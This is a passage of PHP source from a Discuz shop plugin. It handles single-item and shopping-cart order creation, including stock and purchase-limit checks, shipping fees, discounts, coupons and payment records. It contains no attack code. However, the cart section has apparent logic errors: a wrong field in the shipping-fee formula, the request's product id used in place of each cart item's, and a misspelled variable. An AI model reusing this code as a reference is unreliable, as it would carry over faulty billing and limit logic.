					it618_brand_updategoodscount($it618_brand_sale);
			
					if($ii1i11i[3]!='1')return;
					
					it618_brand_delsalework();
					
					echo "okit618_split$id";
					
					if($it618_brand_saleaudio=C::t('#it618_brand#it618_brand_saleaudio')->fetch_by_it618_shopid($ShopId)){
						C::t('#it618_brand#it618_brand_saleaudio')->update($it618_brand_saleaudio['id'],array(
							'it618_state' => 1
						));
					}else{
						C::t('#it618_brand#it618_brand_saleaudio')->insert(array(
							'it618_shopid' => $ShopId,
							'it618_state' => 1
						), true);
					}
					
					if($it618_saletype==1||$it618_saletype==6){
						it618_brand_sendmessage('sale_user',$id);
					}else{
						it618_brand_sendmessage('sale2_user',$id);
					}
					it618_brand_sendmessage('sale_shop',$id);
					it618_brand_sendmessage('sale_admin',$id);
					
					if($IsGroup==1){
						require_once DISCUZ_ROOT.'./source/plugin/it618_group/yunprint.func.php';
						YunPrint('brand',$ShopId,$id);
					}
				}else{
					echo it618_brand_getlang('s490');it618_brand_delsalework();exit;
				}
			}else{
				echo it618_brand_getlang('s491').$creditname." ".it618_brand_getlang('s492')." ".$creditnum." ".it618_brand_getlang('s493').$creditname.it618_brand_getlang('s494').($it618_count*$goods_score+$yunfeiscore)." ".it618_brand_getlang('s495')." ".$creditname." ".it618_brand_getlang('s496');it618_brand_delsalework();exit;
			}
		}
	}
}


if($_GET['ac']=="pay_add"){
	if($uid<=0){
		echo it618_brand_getlang('s484');
	}else{
		set_time_limit (0);
		ignore_user_abort(true);
		
		usleep(mt_rand(300,10000));

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_brand_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_brand_delsalework();
			}
		}
		C::t('#it618_brand#it618_brand_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		
		$pid=intval($_GET['pid']);
		$it618_saletype=intval($_GET['it618_saletype']);
		$it618_gtypeid=intval($_GET['it618_gtypeid']);
		$it618_count=intval($_GET['it618_count']);
		$it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($_GET['pid']);
		
		if(C::t('#it618_brand#it618_brand_brand')->count_by_id($sid)>0){
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($sid);
			$it618_state=$it618_brand_brand['it618_state'];
			if($it618_state==0){
				echo it618_brand_getlang('s380');it618_brand_delsalework();exit;
			}elseif($it618_state==1){
				echo it618_brand_getlang('s380');it618_brand_delsalework();exit;
			}else{
				$it618_htstate=$it618_brand_brand['it618_htstate'];
				if($it618_htstate==0){
					echo it618_brand_getlang('s381');it618_brand_delsalework();exit;
				}elseif($it618_htstate==2){
					echo it618_brand_getlang('s382');it618_brand_delsalework();exit;
				}else{
					$ShopId=$it618_brand_brand['id'];
					$ShopUid=$it618_brand_brand['it618_uid'];
					
					$it618_brand_brandgroup = C::t('#it618_brand#it618_brand_brandgroup')->fetch_by_id($it618_brand_brand['it618_power']);
					$Shop_score=$it618_brand_brandgroup['it618_score'];
				}
			}
			
		}else{
			echo it618_brand_getlang('s380');it618_brand_delsalework();exit;
		}
		
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		if($it618_brand['brand_buyself']==0){
			if($ShopUid==$uid){
				echo it618_brand_getlang('s588');it618_brand_delsalework();exit;
			}
		}
		
		if($it618_brand['brand_bdtel']==1){
			if($it618_members['members_isok']!=''){
				$count=DB::result_first("SELECT count(1) FROM ".DB::table('it618_members_user')." WHERE it618_uid=".$_G['uid']);
				if($count==0){					
					echo $it618_brand_lang['s1887'];it618_brand_delsalework();exit;
				}
			}
		}
		
		if($IsUnion==1&&$_GET['tuijcode']!=''){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/unionsaletc.func.php';
			$it618_tuijid=Union_IsTuiJoin('brand',$pid,$_GET['tuijcode']);
		}
		
		if($it618_brand_goods['it618_isalipay']!=1){
			echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
		}
		
		if($it618_brand_goods['it618_saletype']==4){
			if(!($it618_saletype==1||$it618_saletype==2)){
				echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
			}
		}else{
			if($it618_saletype!=$it618_brand_goods['it618_saletype']){
				echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
			}
		}
		
		$typecount=C::t('#it618_brand#it618_brand_goods_type')->counttype_by_pid_ok($_GET['pid']);
		if($typecount>0){
			if($it618_gtypeid==0){
				echo it618_brand_getlang('t766');it618_brand_delsalework();exit;
			}
		}
		
		if($IsGroup==1){
			$salepower=it618_brand_groupsalepower($pid);
			if($salepower==1){
				echo it618_brand_getlang('s1969');it618_brand_delsalework();exit;
			}
			if($salepower==2){
				echo it618_brand_getlang('s1970');it618_brand_delsalework();exit;
			}
		}
		
		if($it618_gtypeid>0){
			if($it618_brand_goods_type=C::t('#it618_brand#it618_brand_goods_type')->fetch_by_idok($it618_gtypeid)){
				$goods_count=$it618_brand_goods_type['it618_count'];
				$goods_price=$it618_brand_goods_type['it618_uprice'];
				$goods_score=$it618_brand_goods_type['it618_score'];
			}else{
				echo it618_brand_getlang('s1213');it618_brand_delsalework();exit;
			}
		}else{
			$goods_count=$it618_brand_goods['it618_count'];
			$goods_price=$it618_brand_goods['it618_uprice'];
			$goods_score=$it618_brand_goods['it618_score'];
		}
		
		if($it618_brand_goods['it618_jfbl']>0){
			$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$ShopUid);
			if($creditnum=="")$creditnum=0;
	
			if($creditnum<$Shop_score){
				echo it618_brand_getlang('s1750');it618_brand_delsalework();exit;
			}
		}

		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($it618_brand_goods['it618_xiangoutime']==0){
			$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_brand_sale')." where it618_pid=".intval($_GET['pid'])." and it618_type!=0 AND it618_state!=5 and it618_uid=".$uid);				
		}else{
			$time=$_G['timestamp']-$it618_brand_goods['it618_xiangoutime']*3600*24;
			
			$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_brand_sale')." where it618_pid=".intval($_GET['pid'])." and it618_time>$time and it618_type!=0 AND it618_state!=5 and it618_uid=".$uid);
		}
		
		if($buycount=='')$buycount=0;
		
		$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
		if($it618_count<=0){
			echo it618_brand_getlang('s485');it618_brand_delsalework();exit;
		}
		if($it618_count>$goods_count){
			echo it618_brand_getlang('s486');it618_brand_delsalework();exit;
		}elseif($it618_brand_goods['it618_xiangoucount']>0&&$it618_count>$it618_brand_goods['it618_xiangoucount']-$buycount){
			if($it618_brand_goods['it618_xiangoutime']==0){
				echo it618_brand_getlang('s1134').$it618_brand_goods['it618_xiangoucount'].$it618_brand_goods['it618_punit'].it618_brand_getlang('s1139').$buycount.$it618_brand_goods['it618_punit'].it618_brand_getlang('s1140');it618_brand_delsalework();exit;
			}else{
				echo it618_brand_getlang('s1137').$it618_brand_goods['it618_xiangoutime'].it618_brand_getlang('s1138').$it618_brand_goods['it618_xiangoucount'].$it618_brand_goods['it618_punit'].it618_brand_getlang('s1139').$buycount.$it618_brand_goods['it618_punit'].it618_brand_getlang('s1140');it618_brand_delsalework();exit;
			}
		}
		
		if($it618_saletype==2){
			$yunfeimoney=0;
			if($_GET['it618_kdid']>0){
				$it618_brand_kdyunfei=C::t('#it618_brand#it618_brand_kdyunfei')->fetch_by_id($_GET['it618_kdid']);
				if($it618_brand_goods['it618_kgbl']>0){
					if($it618_count*$it618_brand_goods['it618_kgbl']>$it618_brand_kdyunfei['it618_firstkg']){
						$yunfeimoney=$it618_brand_kdyunfei['it618_firstkgprice']+$it618_brand_kdyunfei['it618_kgprice']*($it618_count*$it618_brand_goods['it618_kgbl']-$it618_brand_kdyunfei['it618_firstkg']);
					}else{
						$yunfeimoney=$it618_brand_kdyunfei['it618_firstkgprice'];
					}
				}else{
					if($it618_count>$it618_brand_kdyunfei['it618_firstcount']){
						$yunfeimoney=$it618_brand_kdyunfei['it618_firstprice']+$it618_brand_kdyunfei['it618_price']*($it618_count-$it618_brand_kdyunfei['it618_firstcount']);
					}else{
						$yunfeimoney=$it618_brand_kdyunfei['it618_firstprice'];
					}
				}
			}
		}
		
		if($it618_brand_cardmoney=C::t('#it618_brand#it618_brand_cardmoney')->fetch_by_shopid_uid($ShopId,$uid)){
			$allmoney=$it618_brand_cardmoney['it618_money1']+$it618_brand_cardmoney['it618_money2'];
			$fetch_by_money=C::t('#it618_brand#it618_brand_viplevel')->fetch_by_money($ShopId,$allmoney);
			$viplevel=$fetch_by_money['it618_level'];
		}
		
		if($viplevel!=''){
			$it618_zk=$fetch_by_money['it618_zk'];
			if($_GET['it618_zk']!=$it618_zk){
				echo $it618_zk.it618_brand_getlang('s1436').$_GET['it618_zk'];it618_brand_delsalework();exit;
			}
		}else{
			$it618_zk=100;
		}

		if($ii1i11i[9]!='n')return;
		$tmptime=$_G['timestamp'];
		if($it618_saletype==2){
			$it618_brand_addr = C::t('#it618_brand#it618_brand_addr')->fetch_by_id($_GET['it618_addrid']);
			$curaddr=it618_brand_getlang('s438').$it618_brand_addr['it618_name']." ".it618_brand_getlang('s439').$it618_brand_addr['it618_addr']." ".it618_brand_getlang('s441').$it618_brand_addr['it618_tel'];
			$it618_addr=$curaddr;
			$it618_addr1=$it618_brand_addr['it618_addr'];
			$it618_tel=$it618_brand_addr['it618_tel'];
		}else{
			$it618_addr='';
			$it618_addr1='';
			$it618_tel=$_GET['it618_tel'];
		}

		if($it618_saletype==6){
			$it618_prepaybl=$it618_brand_goods['it618_prepaybl'];
			$prepaybl=$it618_brand_goods['it618_prepaybl']/100;
		}else{
			$it618_prepaybl=100;
			$prepaybl=1;
		}
		
		$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($ShopId);
		
		$it618_kdid=0;
		if($_GET['it618_kdid']>0){
			$it618_brand_kdyunfei=C::t('#it618_brand#it618_brand_kdyunfei')->fetch_by_id($_GET['it618_kdid']);
			$it618_kdid=$it618_brand_kdyunfei['it618_kdid'];
		}
		
		if($IsGroup==1){
			$vipzk=it618_brand_getvipzk($pid);
		}
		
		if($vipzk>0){
			$it618_sfmoney=round(($goods_price*$it618_count*$it618_zk/100*$vipzk/100*$prepaybl),2)+$yunfeimoney;
		}else{
			$it618_sfmoney=round(($goods_price*$it618_count*$it618_zk/100*$prepaybl),2)+$yunfeimoney;
		}
		
		
		
		$quanid=intval($_GET['quanid']);
		if($quanid>0){
			require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
			$it618_union_quansale = C::t('#it618_union#it618_union_quansale')->fetch_by_id($quanid);
			if(it618_union_getisokquan($it618_union_quansale,$it618_brand_goods['id'],$it618_sfmoney)==''){
				echo $it618_union_lang['s319'];it618_brand_delsalework();exit;
			}
			$it618_quanmoney=it618_union_getquantype($it618_union_quansale,'quanmoney');
			if($it618_sfmoney<$it618_quanmoney){
				$it618_quanmoney=$it618_sfmoney;
			}
			$it618_sfmoney=$it618_sfmoney-$it618_quanmoney;
		}
		
		$tc=round(($it618_sfmoney*$it618_brand_brand['it618_tcbl']/100), 2);
		
		if($it618_sfmoney>0){
			if($_GET['paytype']==""){
				echo it618_brand_getlang('s1798');it618_brand_delsalework();exit;
			}
			$it618_type=0;
		}else{
			$it618_type=2;
		}
		
		$id = C::t('#it618_brand#it618_brand_sale')->insert(array(
			'it618_shopid' => $ShopId,
			'it618_uid' => $uid,
			'it618_pid' => $_GET['pid'],
			'it618_pname' => $it618_brand_goods['it618_name'],
			'it618_gtypename' => $it618_brand_goods_type['it618_name'].$it618_brand_goods_type['it618_name1'],
			'it618_prepaybl' => $it618_prepaybl,
			'it618_saletype' => $it618_saletype,
			'it618_gtypeid' => $it618_gtypeid,
			'it618_tuijid' => $it618_tuijid,
			'it618_score' => $goods_score,
			'it618_price' => $goods_price,
			'it618_quanmoney' => $it618_quanmoney,
			'it618_kdid' => $it618_kdid,
			'it618_yunfei' => $yunfeimoney,
			'it618_zk' => $it618_zk,
			'it618_vipzk' => $vipzk,
			'it618_sfmoney' => $it618_sfmoney,
			'it618_sfscore' => 0,
			'it618_count' => $it618_count,
			'it618_addr' => $it618_addr,
			'it618_addr1' => $it618_addr1,
			'it618_tel' => $it618_tel,
			'it618_bz' => it618_brand_utftogbk($_GET['it618_bz']),
			'it618_type' => $it618_type,
			'it618_state' => 1,
			'it618_alipaybl' => $it618_brand_goods['it618_jfbl'],
			'it618_tcbl' => $it618_brand_brand['it618_tcbl'],
			'it618_tc' => $tc,
			'it618_time' => $tmptime
		), true);
		
		if($id>0){
			if($quanid>0){
				DB::query("update ".DB::table('it618_union_quansale')." set it618_saleid=$id,it618_usetime=$tmptime,it618_state=1 where id=".$quanid);
			}
			
			if($it618_sfmoney==0){
				$it618_brand_sale=C::t('#it618_brand#it618_brand_sale')->fetch_by_id($id);
				
				C::t('#it618_brand#it618_brand_money')->insert(array(
					'it618_shopid' => $it618_brand_sale['it618_shopid'],
					'it618_saleid' => $it618_brand_sale['id'],
					'it618_pid' => $it618_brand_sale['it618_pid'],
					'it618_money' => ($it618_brand_sale['it618_price']*$it618_brand_sale['it618_count']+$it618_brand_sale['it618_yunfei']),
					'it618_score' => 0,
					'it618_uid' => $it618_brand_sale['it618_uid'],
					'it618_state' => 1,
					'it618_type' => 3,
					'it618_time' => time()
				), true);
				
				if($it618_brand_sale['it618_saletype']==1||$it618_brand_sale['it618_saletype']==6)it618_brand_setcode($it618_brand_sale['id']);
				if($it618_brand_sale['it618_saletype']==3)it618_brand_setkm($it618_brand_sale['id']);
				if($it618_brand_sale['it618_saletype']==5)it618_brand_qrxf($it618_brand_sale['id']);
				
				it618_brand_updategoodscount($it618_brand_sale);
				
				it618_brand_delsalework();
	
				if($it618_brand_sale['it618_saletype']==1){
					it618_brand_sendmessage('sale_user',$it618_brand_sale['id']);
				}else{
					it618_brand_sendmessage('sale2_user',$it618_brand_sale['id']);
				}
				it618_brand_sendmessage('sale_shop',$it618_brand_sale['id']);
				it618_brand_sendmessage('sale_admin',$it618_brand_sale['id']);
				
				if($IsGroup==1){
					require_once DISCUZ_ROOT.'./source/plugin/it618_group/yunprint.func.php';
					YunPrint('brand',$ShopId,$it618_brand_sale['id']);
				}
				
				if($it618_brand_saleaudio=C::t('#it618_brand#it618_brand_saleaudio')->fetch_by_it618_shopid($it618_brand_sale['it618_shopid'])){
					C::t('#it618_brand#it618_brand_saleaudio')->update($it618_brand_saleaudio['id'],array(
						'it618_state' => 1
					));
				}else{
					C::t('#it618_brand#it618_brand_saleaudio')->insert(array(
						'it618_shopid' => $it618_brand_sale['it618_shopid'],
						'it618_state' => 1
					), true);
				}
				
				echo "quanokit618_split$id";
			}
			
			$saletype='0801';
			$saleid=$id;
			$out_trade_no = date("YmdHis").$saletype.$saleid;
			
			$body=$it618_brand_goods['it618_name'];
			
			$total_fee=$it618_sfmoney;
			
			if(brand_is_mobile()){ 
				$wap=1;
				$url=$_G['siteurl'].it618_brand_getrewrite('brand_wap','uc@1','plugin.php?id=it618_brand:wap&pagetype=uc&sid=1&payok='.$saleid,'?payok='.$saleid);
			}else{
				$wap=0;
				$url=$_G['siteurl'].it618_brand_getrewrite('shop_product',$ShopId.'@'.intval($_GET['pid']),'plugin.php?id=it618_brand:product&sid='.$ShopId.'&pid='.intval($_GET['pid']).'&payok='.$saleid,'?payok='.$saleid);
			}
			
			require_once DISCUZ_ROOT.'./source/plugin/it618_credits/ajaxpay.func.php';
			$domainurl_paytype=getdomainurl_paytype($_G['siteurl'],$_GET['paytype'],$wap);
			$tmparr=explode("it618_split",$domainurl_paytype);
			$domainurl=$tmparr[0];
			$paytype=$tmparr[1];
	
			C::t('#it618_credits#it618_credits_salepay')->insert(array(
				'it618_out_trade_no' => $out_trade_no,
				'it618_uid' => $uid,
				'it618_saletype' => $saletype,
				'it618_saleid' => $saleid,
				'it618_paytype' => $paytype,
				'it618_url' => $url,
				'it618_body' => $body,
				'it618_total_fee' => round($total_fee,2),
				'it618_plugin' => 'it618_brand',
				'it618_wap' => $wap,
				'it618_state' => 0,
				'it618_client' => $_SERVER['HTTP_USER_AGENT'].'<br>'.$_G['clientip'],
				'it618_time' => $_G['timestamp']
			), true);
		
			$ajaxpay=$domainurl.'plugin.php?id=it618_credits:ajaxpay&out_trade_no='.$out_trade_no;
			
			echo "it618_splitokit618_split".$ajaxpay.'it618_split'.$paytype;it618_brand_delsalework();
		}else{
			echo it618_brand_getlang('s490');it618_brand_delsalework();exit;
		}
	}
}


if($_GET['ac']=="gwcpay_add"){
	if($uid<=0){
		echo it618_brand_getlang('s484');
	}else{
		set_time_limit (0);
		ignore_user_abort(true);

		$flagkm=0;$times=0;
		while($flagkm==0){
			if(DB::result_first("select count(1) from ".DB::table('it618_brand_salework'))==0){
				$flagkm=1;
			}
			if($flagkm==0){
				sleep(1);
				$times=$times+1;
			}
			if($times>60){
				it618_brand_delsalework();
			}
		}
		C::t('#it618_brand#it618_brand_salework')->insert(array(
			'it618_iswork' => 1
		), true);
		if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
		
		if($_GET['paytype']==""){
			echo it618_brand_getlang('s1798');it618_brand_delsalework();exit;
		}
		
		if($it618_brand['brand_bdtel']==1){
			if($it618_members['members_isok']!=''){
				$count=DB::result_first("SELECT count(1) FROM ".DB::table('it618_members_user')." WHERE it618_uid=".$_G['uid']);
				if($count==0){					
					echo $it618_brand_lang['s1887'];it618_brand_delsalework();exit;
				}
			}
		}
		
		$brand_gwcpcount=$it618_brand['brand_gwcpcount'];
		
		$count=C::t('#it618_brand#it618_brand_gwc')->count_by_uid($uid);
		if($count==0){
			echo it618_brand_getlang('s1757');it618_brand_delsalework();exit;
		}else if($count>$brand_gwcpcount){
			echo str_replace("gwcpcount",$brand_gwcpcount,it618_brand_getlang('s1758'));it618_brand_delsalework();exit;
		}
		
		foreach(C::t('#it618_brand#it618_brand_gwc')->fetch_all_shopid_by_uid($uid) as $shopids) {
			$it618_brand_brand=C::t('#it618_brand#it618_brand_brand')->fetch_by_id($shopids['it618_shopid']);
			$shopid=$it618_brand_brand['id'];
			$shopname=$it618_brand_brand['it618_name'];
			$shopnamestr=str_replace("shopname",$shopname,it618_brand_getlang('s1753'));
			$it618_state=$it618_brand_brand['it618_state'];
			
			if($it618_state==0){
				echo str_replace(it618_brand_getlang('s1752'),$shopnamestr,it618_brand_getlang('s380'));it618_brand_delsalework();exit;
			}elseif($it618_state==1){
				echo str_replace(it618_brand_getlang('s1752'),$shopnamestr,it618_brand_getlang('s380'));it618_brand_delsalework();exit;
			}else{
				$it618_htstate=$it618_brand_brand['it618_htstate'];
				if($it618_htstate==0){
					echo str_replace(it618_brand_getlang('s1752'),$shopnamestr,it618_brand_getlang('s381'));it618_brand_delsalework();exit;
				}elseif($it618_htstate==2){
					echo str_replace(it618_brand_getlang('s1752'),$shopnamestr,it618_brand_getlang('s382'));it618_brand_delsalework();exit;
				}else{
					$it618_brand_brandgroup = C::t('#it618_brand#it618_brand_brandgroup')->fetch_by_id($it618_brand_brand['it618_power']);
				}
			}
			
			$creditnum=C::t('#it618_brand#it618_brand_sale')->fetch_extcredits_by_uid($it618_brand['brand_credit'],$it618_brand_brand['it618_uid']);
			if($creditnum=="")$creditnum=0;
	
			if($creditnum<$it618_brand_brandgroup['it618_score']){
				echo str_replace("shopname",$shopname,it618_brand_getlang('s1751'));it618_brand_delsalework();exit;
			}
			
			$quanid=intval($_GET['quanid'.$shopid]);
			if($quanid>0){
				require_once DISCUZ_ROOT.'./source/plugin/it618_union/function.func.php';
				$it618_union_quansale = C::t('#it618_union#it618_union_quansale')->fetch_by_id($quanid);
				if(it618_union_getisokquan($it618_union_quansale)==''){
					echo 'it618_splitquanit618_split'.$it618_union_lang['s316'];it618_brand_delsalework();exit;
				}
			
				it618_union_setquanmoney($it618_union_quansale);
			}
		}
		
		C::t('#it618_brand#it618_brand_gwcsale')->delete_by_gwcid_uid(0,$uid);
		$tmptime=$_G['timestamp'];
		foreach(C::t('#it618_brand#it618_brand_gwc')->fetch_all_by_uid($uid) as $it618_brand_gwc) {
			if(lang('plugin/it618_brand', $it618_brand_lang['it618'])!=$it618_brand_lang['version'])exit;
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($ii1i11i[3]!='1')return;
			
			$it618_saletype=intval($it618_brand_gwc['it618_saletype']);
			$it618_gtypeid=intval($it618_brand_gwc['it618_gtypeid']);
			$it618_tujiid=intval($it618_brand_gwc['it618_tuijid']);
			$it618_count=intval($it618_brand_gwc['it618_count']);
			
			if(!($it618_brand_goods = C::t('#it618_brand#it618_brand_goods')->fetch_by_id($it618_brand_gwc['it618_pid']))){
				echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s1754');it618_brand_delsalework();exit;
			}else{
				if($it618_brand_goods['it618_ison']!=1||$it618_brand_goods['it618_state']!=1){
					echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s1754');it618_brand_delsalework();exit;	
				}
			}
			
			if($it618_brand_goods['it618_isalipay']!=1){
				echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s1746');it618_brand_delsalework();exit;
			}
			
			if($it618_brand_goods['it618_saletype']==4){
				if(!($it618_saletype==1||$it618_saletype==2)){
					echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s1747');it618_brand_delsalework();exit;
				}
			}else{
				if($it618_saletype!=$it618_brand_goods['it618_saletype']){
					echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s1747');it618_brand_delsalework();exit;
				}
			}
			
			if($it618_gtypeid>0){
				if($it618_brand_goods_type=C::t('#it618_brand#it618_brand_goods_type')->fetch_by_idok($it618_gtypeid)){
					$goods_count=$it618_brand_goods_type['it618_count'];
					$goods_price=$it618_brand_goods_type['it618_uprice'];
				}else{
					echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s1748');it618_brand_delsalework();exit;
				}
			}else{
				$goods_count=$it618_brand_goods['it618_count'];
				$goods_price=$it618_brand_goods['it618_uprice'];
			}
	
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($it618_brand_goods['it618_xiangoutime']==0){
				$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_brand_sale')." where it618_pid=".intval($_GET['pid'])." and it618_type!=0 AND it618_state!=5 and it618_uid=".$uid);				
			}else{
				$time=$_G['timestamp']-$it618_brand_goods['it618_xiangoutime']*3600*24;
				
				$buycount=DB::result_first("SELECT sum(it618_count) FROM ".DB::table('it618_brand_sale')." where it618_pid=".intval($_GET['pid'])." and it618_time>$time and it618_type!=0 AND it618_state!=5 and it618_uid=".$uid);
			}
			
			if($buycount=='')$buycount=0;
			
			$ii1i11i=array();for($i=0;$i<strlen($_GET['id']);$i++){if(substr($_GET['id'],$i,1)==':')break;$ii1i11i[]=substr($_GET['id'],$i,1);}
			if($it618_count<=0){
				echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s485');it618_brand_delsalework();exit;
			}
			if($it618_count>$goods_count){
				echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s486');it618_brand_delsalework();exit;
			}elseif($it618_brand_goods['it618_xiangoucount']>0&&$it618_count>$it618_brand_goods['it618_xiangoucount']-$buycount){
				if($it618_brand_goods['it618_xiangoutime']==0){
					echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s1134').$it618_brand_goods['it618_xiangoucount'].$it618_brand_goods['it618_punit'].it618_brand_getlang('s1139').$buycount.$it618_brand_goods['it618_punit'].it618_brand_getlang('s1140');it618_brand_delsalework();exit;
				}else{
					echo 'it618_splitgidit618_split'.$it618_brand_gwc['id'].'it618_split'.it618_brand_getlang('s1137').$it618_brand_goods['it618_xiangoutime'].it618_brand_getlang('s1138').$it618_brand_goods['it618_xiangoucount'].$it618_brand_goods['it618_punit'].it618_brand_getlang('s1139').$buycount.$it618_brand_goods['it618_punit'].it618_brand_getlang('s1140');it618_brand_delsalework();exit;
				}
			}
			
			if($it618_brand_cardmoney=C::t('#it618_brand#it618_brand_cardmoney')->fetch_by_shopid_uid($it618_brand_gwc['it618_shopid'],$it618_brand_gwc['it618_uid'])){
				$allmoney=$it618_brand_cardmoney['it618_money1']+$it618_brand_cardmoney['it618_money2'];
				$fetch_by_money=C::t('#it618_brand#it618_brand_viplevel')->fetch_by_money($it618_brand_gwc['it618_shopid'],$allmoney);
				$viplevel=$fetch_by_money['it618_level'];
			}
			
			if($viplevel!=''){
				$it618_zk=$fetch_by_money['it618_zk'];
			}else{
				$it618_zk=100;
			}
			
			$saletypestr='<font color="#999">'.$it618_brand_lang['s1239'].'</font><font color=red>'.$saletypestr.'</font>';
			
			if($it618_saletype==6){
				$prepaybl=$it618_brand_goods['it618_prepaybl']/100;
			}else{
				$prepaybl=1;
			}
			
			$yunfeimoney=0;
			$it618_count=$it618_brand_gwc['it618_count'];
			if($it618_brand_gwc['it618_kdid']>0){
				$it618_brand_kdyunfei=C::t('#it618_brand#it618_brand_kdyunfei')->fetch_by_id($it618_brand_gwc['it618_kdid']);
				if($it618_brand_goods['it618_kgbl']>0){
					if($it618_count*$it618_brand_goods['it618_kgbl']>$it618_brand_kdyunfei['it618_firstkg']){
						$yunfeimoney=$it618_brand_kdyunfei['it618_firstkgprice']+$it618_brand_kdyunfei['it618_kgprice']*($it618_count*$it618_brand_kdyunfei['it618_firstkg']-$it618_brand_kdyunfei['it618_firstkg']);
					}else{
						$yunfeimoney=$it618_brand_kdyunfei['it618_firstkgprice'];
					}
				}else{
					if($it618_count>$it618_brand_kdyunfei['it618_firstcount']){
						$yunfeimoney=$it618_brand_kdyunfei['it618_firstprice']+$it618_brand_kdyunfei['it618_price']*($it618_count-$it618_brand_kdyunfei['it618_firstcount']);
					}else{
						$yunfeimoney=$it618_brand_kdyunfei['it618_firstprice'];
					}
				}
			}
			
			$it618_brand_brand = C::t('#it618_brand#it618_brand_brand')->fetch_by_id($it618_brand_gwc['it618_shopid']);
			$tc=round((($goods_price*$it618_count)*$it618_brand_brand['it618_tcbl']/100), 2);
			if($tc<0)$tc=0;
			
			$it618_brand_addr = C::t('#it618_brand#it618_brand_addr')->fetch_by_id($_GET['it618_addrid']);
			$curaddr=it618_brand_getlang('s438').$it618_brand_addr['it618_name']." ".it618_brand_getlang('s439').$it618_brand_addr['it618_addr']." ".it618_brand_getlang('s441').$it618_brand_addr['it618_tel'];
	
			if($it618_saletype==6){
				$it618_prepaybl=$it618_brand_goods['it618_prepaybl'];
				$prepaybl=$it618_brand_goods['it618_prepaybl']/100;
			}else{
				$it618_prepaybl=100;
				$prepaybl=1;
			}
			
			$it618_kdid=0;
			if($it618_brand_gwc['it618_kdid']>0){
				$it618_brand_kdyunfei=C::t('#it618_brand#it618_brand_kdyunfei')->fetch_by_id($it618_brand_gwc['it618_kdid']);
				$it618_kdid=$it618_brand_kdyunfei['it618_kdid'];
			}
			
			$summoney=round(($goods_price*$it618_zk*$prepaybl*$it618_count/100),2)+$yunfeimoney;
			$allsummoney=$allsummoney+$summoney-$it618_brand_gwc['it618_quanmoney'];
			
			$id = C::t('#it618_brand#it618_brand_gwcsale')->insert(array(
				'it618_gwcid' => 0,
				'it618_shopid' => $it618_brand_gwc['it618_shopid'],
				'it618_uid' => $uid,
				'it618_pid' => $it618_brand_gwc['it618_pid'],
				'it618_pname' => $it618_brand_goods['it618_name'],
				'it618_gtypename' => $it618_brand_goods_type['it618_name'].$it618_brand_goods_type['it618_name1'],
				'it618_prepaybl' => $it618_prepaybl,
				'it618_saletype' => $it618_saletype,
				'it618_gtypeid' => $it618_gtypeid,
				'it618_tuijid' => $it618_tuijid,
				'it618_score' => $goods_score,
				'it618_price' => $goods_price,
				'it618_kdid' => $it618_kdid,
				'it618_yunfei' => $yunfeimoney,
				'it618_zk' => $it618_zk,
				'it618_count' => $it618_count,
				'it618_quanmoney' => $it618_brand_gwc['it618_quanmoney'],
				'it618_addr' => $curaddr,
				'it618_addr1' => $it618_brand_addr['it618_addr'],
				'it618_tel' => $it618_brand_addr['it618_tel'],
				'it618_bz' => it618_brand_utftogbk($_GET['it618_bz']),
				'it618_alipaybl' => $it618_brand_goods['it618_jfbl'],
				'it618_tcbl' => $it618_brand_brand['it618_tcbl'],
				'it618_tc' => $tc,
				'it618_time' => $tmptime
			), true);
		}

		$id = C::t('#it618_brand#it618_brand_gwcsale_main')->insert(array(
			'it618_uid' => $uid,
			'it618_state' => 0,
			'it618_time' => $tmptime
		), true);
		
		foreach(C::t('#it618_brand#it618_brand_gwc')->fetch_all_shopid_by_uid($uid) as $shopids) {
			$quanid=intval($_GET['quanid'.$shopids['it618_shopid']]);
			if($quanid>0){
				DB::query("update ".DB::table('it618_union_quansale')." set it618_gwcid=$id,it618_usetime=$tmptime,it618_state=1 where id=".$quanid);
